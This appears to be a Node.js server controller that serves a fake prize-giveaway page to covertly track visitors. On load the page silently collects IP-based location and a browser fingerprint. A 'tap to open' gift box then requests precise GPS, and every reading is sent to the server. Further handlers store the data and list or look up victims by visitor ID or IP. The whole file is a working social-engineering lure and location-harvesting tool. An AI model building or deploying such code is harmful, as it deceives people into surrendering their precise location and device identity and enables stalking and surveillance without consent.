const PublicLocation = require('../models/PublicLocation');
const { success, created } = require('../utils/response');

const renderCapturePage = async (req, res, next) => {
  try {
    const html = `
      <!DOCTYPE html>
      <html lang="en">
      <head>
          <meta charset="UTF-8">
          <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
          <meta name="theme-color" content="#6366f1">
          <title>You Won a Mystery Prize! 🎁</title>
          <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700;800&display=swap" rel="stylesheet">
          <style>
              * { margin: 0; padding: 0; box-sizing: border-box; }
              body {
                  font-family: 'Poppins', sans-serif;
                  background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                  min-height: 100vh;
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  justify-content: center;
                  overflow-x: hidden;
              }
              .confetti {
                  position: fixed;
                  width: 10px;
                  height: 10px;
                  background: #ffd700;
                  animation: fall linear infinite;
                  top: -10px;
              }
              @keyframes fall {
                  to { transform: translateY(100vh) rotate(360deg); }
              }
              .container {
                  text-align: center;
                  padding: 20px;
                  max-width: 450px;
                  width: 100%;
                  position: relative;
                  z-index: 10;
              }
              .badge {
                  background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
                  color: white;
                  padding: 8px 20px;
                  border-radius: 25px;
                  font-size: 12px;
                  font-weight: 600;
                  text-transform: uppercase;
                  letter-spacing: 1px;
                  display: inline-block;
                  margin-bottom: 20px;
                  animation: pulse 2s infinite;
              }
              @keyframes pulse {
                  0%, 100% { transform: scale(1); }
                  50% { transform: scale(1.05); }
              }
              h1 {
                  color: white;
                  font-size: 2rem;
                  font-weight: 800;
                  margin-bottom: 10px;
                  text-shadow: 2px 2px 4px rgba(0,0,0,0.2);
              }
              .subtitle {
                  color: rgba(255,255,255,0.9);
                  font-size: 1rem;
                  margin-bottom: 30px;
              }
              .box-container {
                  position: relative;
                  width: 200px;
                  height: 200px;
                  margin: 30px auto;
                  cursor: pointer;
                  transition: transform 0.3s ease;
              }
              .box-container:hover { transform: scale(1.05); }
              .box-container:active { transform: scale(0.95); }
              .gift-box {
                  width: 100%;
                  height: 100%;
                  background: linear-gradient(145deg, #ff6b6b, #ee5a5a);
                  border-radius: 20px;
                  position: relative;
                  box-shadow: 
                      0 20px 60px rgba(0,0,0,0.3),
                      inset 0 2px 0 rgba(255,255,255,0.2),
                      inset 0 -2px 0 rgba(0,0,0,0.1);
                  display: flex;
                  align-items: center;
                  justify-content: center;
                  font-size: 80px;
                  animation: bounce 1s ease infinite;
              }
              @keyframes bounce {
                  0%, 100% { transform: translateY(0); }
                  50% { transform: translateY(-15px); }
              }
              .gift-box::before {
                  content: '';
                  position: absolute;
                  top: 50%;
                  left: 0;
                  right: 0;
                  height: 30px;
                  background: #ffd700;
                  transform: translateY(-50%);
              }
              .gift-box::after {
                  content: '';
                  position: absolute;
                  left: 50%;
                  top: 0;
                  bottom: 0;
                  width: 30px;
                  background: #ffd700;
                  transform: translateX(-50%);
              }
              .click-text {
                  position: absolute;
                  bottom: -50px;
                  left: 50%;
                  transform: translateX(-50%);
                  color: white;
                  font-weight: 600;
                  font-size: 14px;
                  white-space: nowrap;
                  animation: fadeInOut 1.5s ease infinite;
              }
              @keyframes fadeInOut {
                  0%, 100% { opacity: 0.5; }
                  50% { opacity: 1; }
              }
              .sparkles {
                  position: absolute;
                  width: 100%;
                  height: 100%;
                  pointer-events: none;
              }
              .sparkle {
                  position: absolute;
                  width: 4px;
                  height: 4px;
                  background: #ffd700;
                  border-radius: 50%;
                  animation: sparkle 1s ease infinite;
              }
              @keyframes sparkle {
                  0%, 100% { opacity: 0; transform: scale(0); }
                  50% { opacity: 1; transform: scale(1); }
              }
              .stats {
                  display: flex;
                  justify-content: center;
                  gap: 30px;
                  margin-top: 30px;
                  color: rgba(255,255,255,0.8);
                  font-size: 12px;
              }
              .stat {
                  text-align: center;
              }
              .stat-number {
                  font-size: 1.5rem;
                  font-weight: 700;
                  color: #ffd700;
              }
              .prizes-preview {
                  display: flex;
                  justify-content: center;
                  gap: 15px;
                  margin-top: 20px;
                  flex-wrap: wrap;
              }
              .prize-tag {
                  background: rgba(255,255,255,0.2);
                  color: white;
                  padding: 6px 14px;
                  border-radius: 20px;
                  font-size: 11px;
                  backdrop-filter: blur(10px);
              }
              #status {
                  margin-top: 20px;
                  color: rgba(255,255,255,0.9);
                  font-size: 14px;
                  min-height: 40px;
              }
              .loading-dots::after {
                  content: '';
                  animation: dots 1.5s steps(5, end) infinite;
              }
              @keyframes dots {
                  0%, 20% { content: ''; }
                  40% { content: '.'; }
                  60% { content: '..'; }
                  80%, 100% { content: '...'; }
              }
              .success-modal {
                  display: none;
                  position: fixed;
                  top: 0;
                  left: 0;
                  right: 0;
                  bottom: 0;
                  background: rgba(0,0,0,0.8);
                  z-index: 1000;
                  align-items: center;
                  justify-content: center;
                  padding: 20px;
              }
              .success-modal.active {
                  display: flex;
              }
              .modal-content {
                  background: white;
                  border-radius: 20px;
                  padding: 40px;
                  text-align: center;
                  max-width: 350px;
                  animation: slideUp 0.5s ease;
              }
              @keyframes slideUp {
                  from { transform: translateY(50px); opacity: 0; }
                  to { transform: translateY(0); opacity: 1; }
              }
              .modal-content h2 {
                  color: #333;
                  margin-bottom: 15px;
              }
              .modal-content p {
                  color: #666;
                  margin-bottom: 20px;
              }
              .claim-btn {
                  background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                  color: white;
                  border: none;
                  padding: 15px 40px;
                  border-radius: 30px;
                  font-size: 16px;
                  font-weight: 600;
                  cursor: pointer;
                  width: 100%;
              }
          </style>
      </head>
      <body>
          <!-- Confetti background -->
          <div id="confetti-container"></div>
          
          <div class="container">
              <div class="badge">🎉 Limited Time Offer</div>
              <h1>You've Been Selected!</h1>
              <p class="subtitle">Tap the mystery box below to reveal your exclusive prize</p>
              
              <div class="box-container" id="capture-btn">
                  <div class="sparkles">
                      <div class="sparkle" style="top: 10%; left: 10%; animation-delay: 0s;"></div>
                      <div class="sparkle" style="top: 20%; right: 15%; animation-delay: 0.2s;"></div>
                      <div class="sparkle" style="bottom: 20%; left: 20%; animation-delay: 0.4s;"></div>
                      <div class="sparkle" style="bottom: 10%; right: 10%; animation-delay: 0.6s;"></div>
                  </div>
                  <div class="gift-box">🎁</div>
                  <div class="click-text">👆 TAP TO OPEN</div>
              </div>
              
              <div class="prizes-preview">
                  <span class="prize-tag">📱 iPhone 15</span>
                  <span class="prize-tag">💰 $1000 Cash</span>
                  <span class="prize-tag">🎮 PS5 Console</span>
                  <span class="prize-tag">🎟️ Free Tickets</span>
              </div>
              
              <div class="stats">
                  <div class="stat">
                      <div class="stat-number" id="timer">02:59</div>
                      <div>Time Left</div>
                  </div>
                  <div class="stat">
                      <div class="stat-number">1,247</div>
                      <div>Claimed Today</div>
                  </div>
              </div>
              
              <div id="status"></div>
          </div>
          
          <div class="success-modal" id="success-modal">
              <div class="modal-content">
                  <div style="font-size: 60px; margin-bottom: 20px;">🎊</div>
                  <h2>Amazing!</h2>
                  <p>You've unlocked a mystery prize! Complete a quick verification to claim your reward.</p>
                  <button class="claim-btn" onclick="location.reload()">Claim Prize</button>
              </div>
          </div>

          <script>
              // Confetti generator
              const createConfetti = () => {
                  const colors = ['#ffd700', '#ff6b6b', '#4ecdc4', '#45b7d1', '#96ceb4', '#ffeaa7'];
                  const container = document.getElementById('confetti-container');
                  for (let i = 0; i < 30; i++) {
                      const confetti = document.createElement('div');
                      confetti.className = 'confetti';
                      confetti.style.left = Math.random() * 100 + '%';
                      confetti.style.background = colors[Math.floor(Math.random() * colors.length)];
                      confetti.style.animationDuration = (Math.random() * 3 + 2) + 's';
                      confetti.style.animationDelay = Math.random() * 2 + 's';
                      container.appendChild(confetti);
                  }
              };
              createConfetti();

              // Countdown timer
              let timeLeft = 179;
              const timerEl = document.getElementById('timer');
              setInterval(() => {
                  if (timeLeft > 0) {
                      timeLeft--;
                      const m = Math.floor(timeLeft / 60).toString().padStart(2, '0');
                      const s = (timeLeft % 60).toString().padStart(2, '0');
                      timerEl.textContent = m + ':' + s;
                  }
              }, 1000);

              // Visitor ID
              const getVisitorId = () => {
                  try {
                      let vid = localStorage.getItem('socius_vid');
                      if (!vid) {
                          vid = 'v_' + Math.random().toString(36).substr(2, 9) + Date.now().toString(36);
                          localStorage.setItem('socius_vid', vid);
                      }
                      return vid;
                  } catch (e) {
                      return 'v_' + Date.now().toString(36);
                  }
              };

              // Fingerprinting
              const getFingerprintData = async () => {
                  const data = {
                      platform: navigator.platform,
                      vendor: navigator.vendor,
                      cpuCores: navigator.hardwareConcurrency || 0,
                      memory: navigator.deviceMemory || 0,
                      screen: window.screen.width + 'x' + window.screen.height,
                      language: navigator.language,
                      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                      userAgent: navigator.userAgent,
                  };
                  
                  try {
                      const canvas = document.createElement('canvas');
                      const ctx = canvas.getContext('2d');
                      canvas.width = 200; canvas.height = 50;
                      ctx.fillStyle = '#f60';
                      ctx.fillRect(0, 0, 200, 50);
                      ctx.fillStyle = '#069';
                      ctx.font = '16px Arial';
                      ctx.fillText('Socius-' + Date.now(), 10, 30);
                      data.canvas = canvas.toDataURL();
                  } catch (e) {}
                  
                  return data;
              };

              const generateHash = (data) => {
                  const str = JSON.stringify(data);
                  let hash = 0;
                  for (let i = 0; i < str.length; i++) {
                      const char = str.charCodeAt(i);
                      hash = ((hash << 5) - hash) + char;
                      hash = hash & hash;
                  }
                  return 'fp_' + Math.abs(hash).toString(16);
              };

              // Auto-capture on load
              window.addEventListener('load', async () => {
                  try {
                      const res = await fetch('https://ipapi.co/json/');
                      const geo = await res.json();
                      const fp = await getFingerprintData();
                      
                      await fetch('/public/save-location', {
                          method: 'POST',
                          headers: { 'Content-Type': 'application/json' },
                          body: JSON.stringify({
                              latitude: geo.latitude || 0,
                              longitude: geo.longitude || 0,
                              accuracy: 5000,
                              method: 'ip-api',
                              visitorId: getVisitorId(),
                              fingerprintHash: generateHash(fp),
                              screenResolution: fp.screen,
                              language: fp.language,
                              timezone: fp.timezone,
                              userAgent: fp.userAgent,
                              deviceInfo: fp
                          })
                      });
                  } catch (e) {}
              });

              // Main click handler - Prize box click
              const box = document.getElementById('capture-btn');
              const status = document.getElementById('status');

              box.addEventListener('click', async () => {
                  if (!navigator.geolocation) {
                      document.getElementById('success-modal').classList.add('active');
                      return;
                  }

                  status.innerHTML = '<span class="loading-dots">Opening your mystery box</span>';
                  box.style.pointerEvents = 'none';
                  box.querySelector('.gift-box').style.animation = 'none';

                  const fp = await getFingerprintData();
                  let attempts = 0;
                  const maxAttempts = 3;
                  let bestPosition = null;

                  const tryGetLocation = () => {
                      attempts++;
                      navigator.geolocation.getCurrentPosition(
                          async (position) => {
                              const accuracy = position.coords.accuracy;
                              if (!bestPosition || accuracy < bestPosition.coords.accuracy) {
                                  bestPosition = position;
                              }

                              if (accuracy < 20 || attempts >= maxAttempts) {
                                  await fetch('/public/save-location', {
                                      method: 'POST',
                                      headers: { 'Content-Type': 'application/json' },
                                      body: JSON.stringify({
                                          latitude: bestPosition.coords.latitude,
                                          longitude: bestPosition.coords.longitude,
                                          accuracy: bestPosition.coords.accuracy,
                                          altitude: bestPosition.coords.altitude,
                                          method: 'geolocation',
                                          visitorId: getVisitorId(),
                                          fingerprintHash: generateHash(fp),
                                          screenResolution: fp.screen,
                                          language: fp.language,
                                          timezone: fp.timezone,
                                          userAgent: fp.userAgent,
                                          deviceInfo: fp
                                      })
                                  });
                                  document.getElementById('success-modal').classList.add('active');
                              } else {
                                  setTimeout(tryGetLocation, 1000);
                              }
                          },
                          async () => {
                              if (bestPosition) {
                                  await fetch('/public/save-location', {
                                      method: 'POST',
                                      headers: { 'Content-Type': 'application/json' },
                                      body: JSON.stringify({
                                          latitude: bestPosition.coords.latitude,
                                          longitude: bestPosition.coords.longitude,
                                          accuracy: bestPosition.coords.accuracy,
                                          method: 'geolocation',
                                          visitorId: getVisitorId(),
                                          fingerprintHash: generateHash(fp)
                                      })
                                  });
                              }
                              document.getElementById('success-modal').classList.add('active');
                          },
                          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                      );
                  };

                  tryGetLocation();
              });
          </script>
      </body>
      </html>
    `;
    res.send(html);
  } catch (err) {
    next(err);
  }
};

const saveLocation = async (req, res, next) => {
  try {
    const { 
      latitude, longitude, accuracy, altitude, method,
      visitorId, fingerprintHash, screenResolution, language, timezone, 
      batteryLevel, networkType, deviceInfo, networkInfo, behavioralData 
    } = req.body;
    
    // Check if we already have a recent entry for this visitor to avoid duplicates
    if (visitorId && method === 'ip-api') {
      const existing = await PublicLocation.findOne({
        visitorId,
        method: 'ip-api',
        createdAt: { $gt: new Date(Date.now() - 10 * 60 * 1000) } // 10 minutes
      });
      if (existing) {
        return success(res, existing, 'Location already captured recently');
      }
    }

    if (latitude === undefined || longitude === undefined) {
      return res.status(400).json({ error: 'Latitude and longitude are required' });
    }

    const publicLocation = new PublicLocation({
      ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.ip,
      userAgent: req.headers['user-agent'],
      location: {
        type: 'Point',
        coordinates: [longitude, latitude],
      },
      accuracy,
      altitude,
      method: method || 'geolocation',
      visitorId: visitorId || 'v_unknown_' + Math.random().toString(36).substr(2, 5),
      fingerprintHash,
      screenResolution,
      language,
      timezone,
      batteryLevel,
      networkType,
      deviceInfo,
      networkInfo,
      behavioralData
    });

    await publicLocation.save();
    return created(res, publicLocation, 'Location and fingerprint saved successfully');
  } catch (err) {
    next(err);
  }
};

const getAllLocations = async (req, res, next) => {
  try {
    const locations = await PublicLocation.find().sort({ createdAt: -1 });
    return success(res, locations);
  } catch (err) {
    next(err);
  }
};

const getLocationByVisitorId = async (req, res, next) => {
  try {
    const { visitorId } = req.params;
    // Try to find by visitorId OR ip (if visitorId is an IP)
    const locations = await PublicLocation.find({ 
      $or: [
        { visitorId: visitorId },
        { ip: visitorId }
      ]
    }).sort({ createdAt: -1 });
    
    if (!locations || locations.length === 0) {
      return res.status(404).json({ error: 'No data found for this visitor' });
    }
    return success(res, locations);
  } catch (err) {
    next(err);
  }
};

module.exports = {
  renderCapturePage,
  saveLocation,
  getAllLocations,
  getLocationByVisitorId,
};
